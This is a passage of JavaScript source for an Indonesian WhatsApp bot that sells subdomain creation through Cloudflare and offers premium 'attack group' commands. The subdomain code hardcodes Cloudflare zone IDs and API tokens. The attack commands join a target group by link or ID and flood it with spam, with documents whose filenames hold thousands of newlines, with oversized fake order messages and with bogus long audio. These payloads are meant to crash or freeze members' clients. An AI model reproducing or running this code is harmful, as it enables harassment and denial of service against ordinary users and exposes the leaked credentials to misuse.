                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 4000, db_saldo)
           break
          case 'buydomain11': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb040b2fa1975c2daf0df485c9b27f72";
               let apitoken = "fXnytgaVk-hJJnY6hYcu2yzDcl6LXDdM6wzhqJOzHTHTW4LsJa";
               let tld = "privateyour.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 8000, db_saldo)
           break
          case 'buydomain12': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "082d880e4df98024ef1b01ba5e6ac6f0";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "rafatharoffcial-private.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 12000, db_saldo)
           break
     case 'delgc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini Tuan✅`)
break
case 'addgc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini Tuan✅`)
           break      
// LAST DI ATAS
// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "Rafathar Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "Rafathar Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE Rafathar`", fileName: `Rafathar ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE Rafathar`", fileName: `Rafathar ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube rafathar`",
"message": `${button}`,
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V2 ( PAKE ID GROUP )
case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "Rafathar Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "YOUTUBE Rafathar Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Offcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE Rafathar Bug🔥`", fileName: `Rafathar Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE Rafathar Bug🔥`", fileName: `Rafathar Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Rafathar Bug🔥`",
"message": `${button}`,
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@rafatharoffcial", 
"sourceUrl": "https://youtube.com/@rafatharoffcial" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
